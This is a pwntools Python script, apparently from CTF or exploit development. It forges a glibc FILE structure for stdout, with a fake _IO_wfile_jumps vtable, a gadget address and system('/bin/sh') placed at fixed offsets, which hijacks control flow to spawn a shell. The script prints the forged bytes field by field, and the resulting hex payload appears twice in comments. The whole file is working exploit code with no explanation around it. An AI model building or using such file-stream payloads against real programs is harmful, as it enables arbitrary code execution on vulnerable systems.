from pwn import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc.address = 0x71e443a00000

# some constants
stdout_lock = libc.address + 0x21ca70   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x1636a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
# write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
# print offsets
# print(bytes(fake).hex())
off = 0
aux = bytes(fake)
print(aux.hex())
for x in fake.length:
    # print(f'{x}: {hex(off)}')
    print(x, aux[off:off+fake.length[x]].hex())
    off += fake.length[x]


# 010101010101013b0000000000000000700da543e47100000000000000000000000000000000000000000000000000002f62696e2f73680000000000000000000000000000000000a036b643e471000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffff000000000000000070cac143e4710000ffffffffffffffff38b8c143e471000080b9c143e471000000000000000000000000000000000000a0b7c143e4710000000000000000000000000000000000000000000000000000a870c143e47100000000000000000000

# 010101010101013b0000000000000000700da543e47100000000000000000000000000000000000000000000000000002f62696e2f73680000000000000000000000000000000000a036b643e471000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffff000000000000000070cac143e4710000ffffffffffffffff38b8c143e471000080b9c143e471000000000000000000000000000000000000a0b7c143e4710000000000000000000000000000000000000000000000000000a870c143e47100000000000000000000